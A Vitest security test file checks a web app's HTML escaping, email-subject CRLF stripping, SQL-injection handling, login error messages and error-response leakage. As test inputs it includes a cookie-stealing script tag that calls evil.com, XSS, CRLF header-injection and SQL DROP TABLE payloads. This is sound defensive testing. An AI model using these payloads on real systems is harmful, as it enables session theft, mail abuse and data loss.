import { describe, it, expect, vi, beforeEach } from "vitest";
import { prisma } from "@/lib/prisma";
import { createRequest, parseJsonResponse } from "../helpers/request";
import { escapeHtml, sanitizeEmailSubject } from "@/lib/security";

const mockPrisma = prisma as unknown as Record<string, Record<string, ReturnType<typeof vi.fn>>>;

describe("Injection Attack Prevention", () => {
  beforeEach(() => {
    vi.restoreAllMocks();
  });

  describe("XSS Prevention", () => {
    it("should escape script tags in HTML output", () => {
      const malicious = '<script>document.location="http://evil.com?c="+document.cookie</script>';
      const escaped = escapeHtml(malicious);

      expect(escaped).not.toContain("<script>");
      expect(escaped).not.toContain("</script>");
      expect(escaped).toContain("&lt;script&gt;");
    });

    it("should escape event handler attributes", () => {
      const payload = '<img onerror="alert(1)" src=x>';
      const escaped = escapeHtml(payload);

      expect(escaped).not.toContain("<img");
      expect(escaped).toContain("&lt;img");
    });

    it("should escape SVG-based XSS", () => {
      const payload = '<svg onload="alert(1)">';
      const escaped = escapeHtml(payload);

      expect(escaped).toContain("&lt;svg");
    });

    it("should escape nested encoding attempts", () => {
      const payload = '"><script>alert(String.fromCharCode(88,83,83))</script>';
      const escaped = escapeHtml(payload);

      expect(escaped).not.toContain("<script>");
    });

    it("should accept XSS payloads as conversation data (Prisma handles safely)", async () => {
      const xssPayload = '<script>alert("xss")</script>';
      mockPrisma.conversation.create.mockResolvedValue({
        id: "conv-xss",
        channel: "web",
        customerName: xssPayload,
        messages: [],
        _count: { messages: 0 },
        tags: [],
      });

      const { POST } = await import("@/app/api/conversations/route");
      const request = createRequest("/api/conversations", {
        method: "POST",
        body: { channel: "web", customerName: xssPayload },
      });

      const response = await POST(request);
      expect(response.status).toBe(201);

      // Prisma stores it as-is (parameterized queries prevent SQL injection)
      // XSS escaping happens at render time, not storage
      expect(mockPrisma.conversation.create).toHaveBeenCalled();
    });
  });

  describe("Email CRLF Injection Prevention", () => {
    it("should strip CR from email subjects", () => {
      const subject = "Normal Subject\rBcc: attacker@evil.com";
      expect(sanitizeEmailSubject(subject)).not.toContain("\r");
    });

    it("should strip LF from email subjects", () => {
      const subject = "Normal Subject\nX-Injected: header";
      expect(sanitizeEmailSubject(subject)).not.toContain("\n");
    });

    it("should strip CRLF combination", () => {
      const subject = "Subject\r\nBcc: attacker@evil.com\r\nContent-Type: text/html";
      const sanitized = sanitizeEmailSubject(subject);

      expect(sanitized).not.toContain("\r");
      expect(sanitized).not.toContain("\n");
      expect(sanitized).toContain("Subject");
    });
  });

  describe("SQL Injection Prevention (Prisma)", () => {
    it("should safely handle SQL-like payloads in search params", async () => {
      mockPrisma.conversation.findMany.mockResolvedValue([]);

      const { GET } = await import("@/app/api/conversations/route");
      const request = createRequest("/api/conversations", {
        searchParams: { search: "'; DROP TABLE conversations; --" },
      });

      const response = await GET(request);
      expect(response.status).toBe(200);

      // Prisma uses parameterized queries, so this is passed as a string value
      expect(mockPrisma.conversation.findMany).toHaveBeenCalledWith(
        expect.objectContaining({
          where: expect.objectContaining({
            OR: expect.arrayContaining([
              expect.objectContaining({
                customerName: expect.objectContaining({
                  contains: "'; DROP TABLE conversations; --",
                }),
              }),
            ]),
          }),
        })
      );
    });

    it("should safely handle SQL injection in ticket search", async () => {
      mockPrisma.ticket.findMany.mockResolvedValue([]);

      const { GET } = await import("@/app/api/tickets/route");
      const request = createRequest("/api/tickets", {
        searchParams: { search: "1 OR 1=1" },
      });

      const response = await GET(request);
      expect(response.status).toBe(200);
    });
  });

  describe("Oversized Payload Protection", () => {
    it("should handle large payloads without crashing", async () => {
      mockPrisma.ticket.create.mockResolvedValue({
        id: "ticket-large",
        title: "A".repeat(500),
        conversation: null,
        department: null,
        assignedTo: null,
      });

      const { POST } = await import("@/app/api/tickets/route");
      const request = createRequest("/api/tickets", {
        method: "POST",
        body: {
          title: "A".repeat(500),
          description: "B".repeat(10000),
        },
      });

      const response = await POST(request);
      // Should either accept (within limits) or reject gracefully
      expect([201, 400, 413]).toContain(response.status);
    });
  });

  describe("Auth Security", () => {
    it("should not reveal whether username exists on failed login", async () => {
      // When user doesn't exist
      mockPrisma.admin.findUnique.mockResolvedValue(null);

      const { POST } = await import("@/app/api/auth/route");

      const request1 = createRequest("/api/auth", {
        method: "POST",
        body: { action: "login", username: "nonexistent", password: "wrong" },
      });
      const response1 = await POST(request1);
      const data1 = await parseJsonResponse(response1);

      // Should return same error message regardless
      expect(data1.error).toBe("Invalid credentials");
    });
  });

  describe("Error Response Safety", () => {
    it("should not leak database details in error responses", async () => {
      mockPrisma.conversation.findMany.mockRejectedValue(
        new Error("PrismaClientKnownRequestError: Connection refused to database rbai_production")
      );

      const { GET } = await import("@/app/api/conversations/route");
      const request = createRequest("/api/conversations");
      const response = await GET(request);
      const data = await parseJsonResponse(response);

      expect(response.status).toBe(500);
      expect(data.error).toBe("Failed to fetch conversations");
      // Error message should NOT contain database details
      expect(JSON.stringify(data)).not.toContain("rbai_production");
      expect(JSON.stringify(data)).not.toContain("PrismaClient");
    });
  });
});
